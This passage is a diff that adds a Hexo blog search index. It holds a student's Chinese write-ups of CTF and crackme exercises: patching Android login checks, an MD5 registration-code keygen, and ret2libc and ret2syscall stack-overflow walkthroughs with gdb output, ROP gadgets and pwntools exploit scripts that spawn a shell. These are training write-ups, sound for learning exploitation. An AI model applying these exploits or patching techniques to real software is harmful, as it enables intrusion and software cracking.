@@ -1,0 +1,350 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Android_Crackme</title>
+    <url>/2020/01/15/Android-Crackme/</url>
+    <content><![CDATA[<p>最近在参加xman冬令营培训，学习移动安全，今天做了几个简单的android crackme，写篇博客记录一下。</p>
+<a id="more"></a>
+
+<h1 id="一-Heziran"><a href="#一-Heziran" class="headerlink" title="一.Heziran"></a>一.Heziran</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>下载下apk文件后放到模拟器中安装，先打开看看。</p>
+<p><img src="https://i.loli.net/2020/01/15/PXAjbGKWJLY9QRe.png" alt="adcm1.jpg"></p>
+<p>尝试登录</p>
+<p><img src="https://i.loli.net/2020/01/15/aD8uhQYbnT6zUR1.png" alt="adcm2.jpg"></p>
+<h2 id="2-查看源码"><a href="#2-查看源码" class="headerlink" title="2.查看源码"></a>2.查看源码</h2><p>用MT管理器打开apk文件（进入/data/app/目录下寻找，按安装时间来找），在两个.dex文件中寻找了一下没有找到ManActivity，发现一个可疑的zip文件，进去看看发现一堆.dex文件</p>
+<p><img src="https://i.loli.net/2020/01/15/J7XHEanNQWLMcsA.png" alt="adcm3.jpg"></p>
+<p>用Dex编辑器++全部打开，找到manactivity点进去，搜索“登录失败”，定位到目标代码段。</p>
+<p><img src="https://i.loli.net/2020/01/15/EtiyNpxc4X78Kme.png" alt="adcm4.jpg"></p>
+<p>向上找，即可发现登录的用户名密码，都是明文存储的，回app内验证一下：</p>
+<p><img src="https://i.loli.net/2020/01/15/keilqK2dfQ713Ox.png" alt="adcm5.jpg"></p>
+<p>成功。</p>
+<h1 id="二-任意登录"><a href="#二-任意登录" class="headerlink" title="二.任意登录"></a>二.任意登录</h1><h2 id="1-收集信息"><a href="#1-收集信息" class="headerlink" title="1.收集信息"></a>1.收集信息</h2><p>安装好apk后打开看看</p>
+<p><img src="https://i.loli.net/2020/01/15/UKigL4t78Rzmhwv.png" alt="adcm6.jpg"></p>
+<h2 id="2-工具分析"><a href="#2-工具分析" class="headerlink" title="2.工具分析"></a>2.工具分析</h2><p>使用jadx查看源码</p>
+<p><img src="https://i.loli.net/2020/01/15/VIlacWxruR8ozEO.png" alt="adcm7.jpg"></p>
+<p>发现明文的用户名密码，显然这题我们已经拿到正确的用户名密码了，我就不贴验证的图了。但我们的目的是实现任意用户名密码登录。所以要想办法修改程序的smali代码并进行重新打包编译签名。</p>
+<h3 id="1-分析smali代码"><a href="#1-分析smali代码" class="headerlink" title="(1).分析smali代码"></a>(1).分析smali代码</h3><p>定位到checkSN函数</p>
+<p><img src="https://i.loli.net/2020/01/15/8kQfunsjoPbq7TK.png" alt="adcm8.jpg"></p>
+<p>耐心看明白这些if-eqz的含义就是判断输入的用户名密码是否正确，因此最简单的部分就是让程序跳过这部分代码。</p>
+<h3 id="2-Androidkiller修改程序"><a href="#2-Androidkiller修改程序" class="headerlink" title="(2).Androidkiller修改程序"></a>(2).Androidkiller修改程序</h3><p>这里我们使用Androidkiller来修改代码并重新编译</p>
+<p><img src="https://i.loli.net/2020/01/15/tmfl5XH1JhvdPeU.png" alt="adcm9.jpg"></p>
+<p>记得修改后一定要保存再重新编译，否则不成功。</p>
+<p><img src="https://i.loli.net/2020/01/15/GHa9fNmuJpOtRwv.png" alt="adcm10.jpg"></p>
+<h3 id="3-验证"><a href="#3-验证" class="headerlink" title="(3).验证"></a>(3).验证</h3><p>之后在androidkiller安装目录下的projects\demo01\Bin目录下找到重新编译后的apk，安装进模拟器验证是否成功。</p>
+<p><img src="https://i.loli.net/2020/01/15/IpG6STJcFaqOone.png" alt="adcm11.jpg"></p>
+<p>成功！</p>
+<h1 id="三-注册码"><a href="#三-注册码" class="headerlink" title="三.注册码"></a>三.注册码</h1><p>先打开程序运行一下，要求是输入一个用户名以及此用户名对应的注册码。</p>
+<p><img src="https://i.loli.net/2020/01/15/LeUwd17uKniW6Tg.png" alt="adcm12.jpg"></p>
+<h3 id="工具分析"><a href="#工具分析" class="headerlink" title="工具分析"></a>工具分析</h3><p><img src="https://i.loli.net/2020/01/15/5cUWaeSQtXqJRsH.png" alt="adcm13.jpg"></p>
+<p><img src="https://i.loli.net/2020/01/15/LKDIWRApBlVJfzx.png" alt="adcm14.jpg"></p>
+<p>这是两段关键代码，分析即可明白，注册码即为输入的用户名取md5后去掉奇数位字符所剩下的字符串。</p>
+<h3 id="py脚本"><a href="#py脚本" class="headerlink" title="py脚本"></a>py脚本</h3><p><img src="https://i.loli.net/2020/01/15/4txOXzWDAG2JEvu.png" alt="adcm15.jpg"></p>
+<p>脚本代码：</p>
+<p><code>import hashlib</code></p>
+<p><code>your_str = input(&quot;Please input your username: &quot;)</code></p>
+<p><code>m = hashlib.md5()</code></p>
+<p><code>b = your_str.encode(encoding=&#39;utf-8&#39;)</code><br><code>m.update(b)</code><br><code>gencode = m.hexdigest()</code></p>
+<p><code>code_list = []</code><br><code>i = 0</code><br><code>while i &lt; len(gencode) :</code><br>    <code>code_list.append(gencode[i])</code><br>    <code>i += 2</code></p>
+<p><code>code = &#39;&#39;.join(code_list)</code><br><code>print(&quot;Your code: &quot; + code)</code></p>
+<p>这些都是非常简单的题目，很适合入门练手，题目apk文件改天再放上来吧，准备洗洗睡了，明天还有课。</p>
+<hr>
+<p>下载链接：</p>
+<p>1.<a href="https://www.52pojie.cn/forum.php?mod=attachment&aid=OTE2MTAxfGJhNzg3Y2VhfDE1NzkxNTU2OTV8MTI2ODM1MXw2MjY3OTA%3D" target="_blank" rel="noopener">heziran</a></p>
+<p>2.<a href="https://www.52pojie.cn/forum.php?mod=attachment&aid=Mzk0NDYyfDFkZGY5Nzk3fDE1NzkxNTU0MzB8MTI2ODM1MXwzMzY1NTA%3D" target="_blank" rel="noopener">任意登录</a></p>
+<p>3.<a href="https://www.52pojie.cn/forum.php?mod=attachment&aid=NDM3NzM5fDRlNGU3ZTlhfDE1NzkxNTU2NTN8MTI2ODM1MXwzNjUzOTQ%3D" target="_blank" rel="noopener">注册码</a></p>
+<p>链接应该没有错，都是吾爱上的练手题。</p>
+]]></content>
+      <categories>
+        <category>Mobile</category>
+        <category>Android</category>
+      </categories>
+      <tags>
+        <tag>Android</tag>
+        <tag>Crackme</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2libc1</title>
+    <url>/2019/10/26/ret2libc1/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1" target="_blank" rel="noopener">ret2libc1</a></p>
+<a id="more"></a>
+
+<h1 id="1-查看基本信息"><a href="#1-查看基本信息" class="headerlink" title="1.查看基本信息"></a>1.查看基本信息</h1><h2 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h2><p><img src="https://i.loli.net/2019/10/26/7QNv3PXOGewji1d.png" alt="r2lbc1.png"></p>
+<p><strong>查看保护</strong></p>
+<p><img src="https://i.loli.net/2019/10/26/MpOBikcTCRv5Hjx.png" alt="r2lbc2.png"></p>
+<p><strong>查看ida反汇编</strong></p>
+<p><img src="https://i.loli.net/2019/10/26/In2k48EgGjRYq6s.png" alt="r2lbc3.png"></p>
+<h1 id="2-定位漏洞及利用分析"><a href="#2-定位漏洞及利用分析" class="headerlink" title="2.定位漏洞及利用分析"></a>2.定位漏洞及利用分析</h1><p>ida可知，gets()函数存在栈溢出漏洞。但由于开启了堆栈不可执行保护，不能使用ret2shellcode的方法。但是存在system函数。</p>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="1-寻找”-bin-sh”"><a href="#1-寻找”-bin-sh”" class="headerlink" title="1.寻找”/bin/sh”"></a>1.寻找”/bin/sh”</h3><p>首先要知道”/bin/sh”字符串的地址。</p>
+<p>两种方法：</p>
+<p>1.</p>
+<p><img src="https://i.loli.net/2019/10/26/Wf1qEOyHSvlCPGA.jpg" alt="r2lbc4.jpg"></p>
+<p>2.</p>
+<p><img src="https://i.loli.net/2019/10/26/MpkRGvQd9i1KXAf.png" alt="5.png"></p>
+<p>binsh_addr = 0x08048720</p>
+<h3 id="2-寻找system函数在plt中的地址"><a href="#2-寻找system函数在plt中的地址" class="headerlink" title="2.寻找system函数在plt中的地址"></a>2.寻找system函数在plt中的地址</h3><p><img src="https://i.loli.net/2019/10/26/lHXzGCjfFokin8h.png" alt="r2lbc5.png"></p>
+<p>sys_plt = 0x08048460</p>
+<h3 id="3-计算溢出偏移量"><a href="#3-计算溢出偏移量" class="headerlink" title="3.计算溢出偏移量"></a>3.计算溢出偏移量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ pattern create 150</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/hc/study/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1 </span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb45c0 --&gt; 0xfbad2288 </span><br><span class="line">EDX: 0xf7fb589c --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb4000 --&gt; 0x1d4d6c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x6941414d (&apos;MAAi&apos;)</span><br><span class="line">ESP: 0xffffce80 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">EIP: 0x41384141 (&apos;AA8A&apos;)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41384141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffce80 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0004| 0xffffce84 (&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0008| 0xffffce88 (&quot;AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0012| 0xffffce8c (&quot;AkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0016| 0xffffce90 (&quot;PAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0020| 0xffffce94 (&quot;AAQAAmAARAAoAA&quot;)</span><br><span class="line">0024| 0xffffce98 (&quot;AmAARAAoAA&quot;)</span><br><span class="line">0028| 0xffffce9c (&quot;RAAoAA&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 in ?? ()</span><br><span class="line">gdb-peda$ pattern offset AA8A</span><br><span class="line">AA8A found at offset: 112</span><br><span class="line">gdb-peda$ pattern search</span><br><span class="line">Registers contain pattern buffer:</span><br><span class="line">EBP+0 found at offset: 108</span><br><span class="line">EIP+0 found at offset: 112</span><br><span class="line">Registers point to pattern buffer:</span><br><span class="line">[ESP] --&gt; offset 116 - size ~34</span><br><span class="line">Pattern buffer found at:</span><br><span class="line">0x0804b160 : offset    0 - size  150 ([heap])</span><br><span class="line">0xffffce0c : offset    0 - size  150 ($sp + -0x74 [-29 dwords])</span><br><span class="line">References to pattern buffer found at:</span><br><span class="line">0xf7fb45cc : 0x0804b160 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d0 : 0x0804b160 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d4 : 0x0804b160 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d8 : 0x0804b160 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45dc : 0x0804b160 (/lib32/libc-2.27.so)</span><br><span class="line">0xffffcc84 : 0x0804b160 ($sp + -0x1fc [-127 dwords])</span><br><span class="line">0xffffcd54 : 0x0804b160 ($sp + -0x12c [-75 dwords])</span><br><span class="line">0xffffcdcc : 0xffffce0c ($sp + -0xb4 [-45 dwords])</span><br><span class="line">0xffffcdf0 : 0xffffce0c ($sp + -0x90 [-36 dwords])</span><br></pre></td></tr></table></figure>
+
+<p>得到基于eip的偏移112</p>
+<h1 id="3-编写exp"><a href="#3-编写exp" class="headerlink" title="3.编写exp"></a>3.编写exp</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./ret2libc1&apos;)</span><br><span class="line">sys_plt_addr = 0x08048460</span><br><span class="line">binsh_addr = 0x08048720</span><br><span class="line">payload = 112*&apos;A&apos; + p32(sys_plt_addr) + p32(0xdeadbeef) + p32(binsh_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/10/26/WGDiXUECVTSyYfF.png" alt="r2lbc6.png"></p>
+]]></content>
+      <categories>
+        <category>Linux pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>basic_rop</tag>
+        <tag>ret2libc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bamboofox-ret2syscall</title>
+    <url>/2019/10/20/bamboofox-ret2syscall/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall" target="_blank" rel="noopener">bamboofox-ret2syscall</a></p>
+<a id="more"></a>
+
+<h1 id="1-基本信息收集"><a href="#1-基本信息收集" class="headerlink" title="1.基本信息收集"></a>1.基本信息收集</h1><h2 id="查看文件信息"><a href="#查看文件信息" class="headerlink" title="查看文件信息"></a>查看文件信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file rop</span><br><span class="line">rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checksec rop</span><br><span class="line">[*] &apos;/home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<h2 id="IDA反汇编看伪代码"><a href="#IDA反汇编看伪代码" class="headerlink" title="IDA反汇编看伪代码"></a>IDA反汇编看伪代码</h2><p><img src="https://i.loli.net/2019/10/20/Yqg7bcJ12kHW6eD.png" alt="r2sys1.png"></p>
+<h1 id="2-漏洞定位及利用思路"><a href="#2-漏洞定位及利用思路" class="headerlink" title="2.漏洞定位及利用思路"></a><strong>2.漏洞定位及利用思路</strong></h1><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a><strong>ret2syscall</strong></h2><p>很明显gets()函数存在溢出漏洞，但本题没有找到system(“/bin/sh”)函数，且开启了堆栈不可执行保护，因此ret2text，ret2shellcode都无法使用。</p>
+<p>这时我们就可以使用ret2syscall的方法了。</p>
+<p>ret2syscall，即控制程序执行系统调用，获取 shell。简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure>
+
+<p>其中，该程序是 32 位，所以我们需要使得</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
+<h2 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h2><h3 id="eax"><a href="#eax" class="headerlink" title="eax"></a>eax</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --only &quot;pop|ret&quot; | grep &quot;eax&quot;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
+
+<p>这里我们选择0x080bb196</p>
+<h3 id="ebx"><a href="#ebx" class="headerlink" title="ebx"></a>ebx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --only &quot;pop|ret&quot; | grep &quot;ebx&quot;</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>这里我们选择0x0806eb90</p>
+<h3 id="int-80"><a href="#int-80" class="headerlink" title="int 80"></a>int 80</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> ROPgadget --binary rop --only &apos;int&apos; </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0806bbfd : int 0x66</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x08089488 : int 0xca</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line">0x080c1871 : int 6</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure>
+
+<p>0x08049421</p>
+<h3 id="bin-sh"><a href="#bin-sh" class="headerlink" title="/bin/sh"></a>/bin/sh</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --string &apos;/bin/sh&apos;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>0x080be408</p>
+<h1 id="3-利用步骤"><a href="#3-利用步骤" class="headerlink" title="3.利用步骤"></a>3.利用步骤</h1><h2 id="1-计算偏移量"><a href="#1-计算偏移量" class="headerlink" title="1.计算偏移量"></a>1.计算偏移量</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ pattern create 150</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop </span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What do you plan to do?</span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x80481a8 (&lt;_init&gt;:    push   ebx)</span><br><span class="line">ECX: 0xfbad2288 </span><br><span class="line">EDX: 0x80eb4e0 --&gt; 0x0 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x80ea00c --&gt; 0x8067b10 (&lt;__stpcpy_sse2&gt;:  mov    edx,DWORD PTR [esp+0x4])</span><br><span class="line">EBP: 0x6941414d (&apos;MAAi&apos;)</span><br><span class="line">ESP: 0xffffce60 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">EIP: 0x41384141 (&apos;AA8A&apos;)</span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41384141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffce60 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0004| 0xffffce64 (&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0008| 0xffffce68 (&quot;AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0012| 0xffffce6c (&quot;AkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0016| 0xffffce70 (&quot;PAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0020| 0xffffce74 (&quot;AAQAAmAARAAoAA&quot;)</span><br><span class="line">0024| 0xffffce78 (&quot;AmAARAAoAA&quot;)</span><br><span class="line">0028| 0xffffce7c (&quot;RAAoAA&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 in ?? ()</span><br><span class="line">gdb-peda$ pattern search</span><br><span class="line">Registers contain pattern buffer:</span><br><span class="line">EBP+0 found at offset: 108</span><br><span class="line">EIP+0 found at offset: 112</span><br><span class="line">Registers point to pattern buffer:</span><br><span class="line">[ESP] --&gt; offset 116 - size ~34</span><br><span class="line">Pattern buffer found at:</span><br><span class="line">0xf7ff9000 : offset    0 - size  150 (mapped)</span><br><span class="line">0xffffcdec : offset    0 - size  150 ($sp + -0x74 [-29 dwords])</span><br><span class="line">References to pattern buffer found at:</span><br><span class="line">0x080ea36c : 0xf7ff9000 (/home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)</span><br><span class="line">0x080ea370 : 0xf7ff9000 (/home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)</span><br><span class="line">0x080ea374 : 0xf7ff9000 (/home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)</span><br><span class="line">0x080ea378 : 0xf7ff9000 (/home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)</span><br><span class="line">0x080ea37c : 0xf7ff9000 (/home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)</span><br><span class="line">0xffffccb4 : 0xf7ff9000 ($sp + -0x1ac [-107 dwords])</span><br><span class="line">0xffffcd50 : 0xf7ff9000 ($sp + -0x110 [-68 dwords])</span><br><span class="line">0xffffcd60 : 0xffffcdec ($sp + -0x100 [-64 dwords])</span><br><span class="line">0xffffcdd0 : 0xffffcdec ($sp + -0x90 [-36 dwords])</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-编写exp"><a href="#2-编写exp" class="headerlink" title="2.编写exp"></a>2.编写exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./rop'</span>)</span><br><span class="line">eax_addr = <span class="number">0x080bb196</span></span><br><span class="line">pd_pc_pb_r = <span class="number">0x0806eb90</span></span><br><span class="line">int_addr = <span class="number">0x08049421</span></span><br><span class="line">binsh_addr = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'A'</span>*<span class="number">112</span>,eax_addr,<span class="number">0xb</span>,pd_pc_pb_r,<span class="number">0</span>,<span class="number">0</span>,binsh_addr,int_addr])</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/10/20/59KB4kZhIt67WLC.png" alt="r2sys2.png"></p>
+]]></content>
+      <categories>
+        <category>Linux pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>basic_rop</tag>
+        <tag>ret2syscall</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sniperoj-pwn100-shellcode-x86-64</title>
+    <url>/2019/10/19/sniperoj-pwn100-shellcode-x86-64/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2shellcode/sniperoj-pwn100-shellcode-x86-64" target="_blank" rel="noopener">sniperoj-pwn100-shellcode-x86-64</a></p>
+<a id="more"></a>
+
+<h1 id="1-基本信息收集"><a href="#1-基本信息收集" class="headerlink" title="1.基本信息收集"></a>1.基本信息收集</h1><h2 id="查看文件信息："><a href="#查看文件信息：" class="headerlink" title="查看文件信息："></a>查看文件信息：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file shellcode</span><br><span class="line">shellcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=4600df3dbafbffc6436a38e95b386fc8afbbd63b, not stripped</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看保护："><a href="#查看保护：" class="headerlink" title="查看保护："></a>查看保护：</h2><p><img src="https://i.loli.net/2019/10/19/mxuWQlXzLKbi8E9.png" alt="r2sc1.png"></p>
+<h2 id="ida查看反汇编："><a href="#ida查看反汇编：" class="headerlink" title="ida查看反汇编："></a>ida查看反汇编：</h2><p><img src="https://i.loli.net/2019/10/19/4TtHoB8YDSac9WM.png" alt="r2sc2.png"></p>
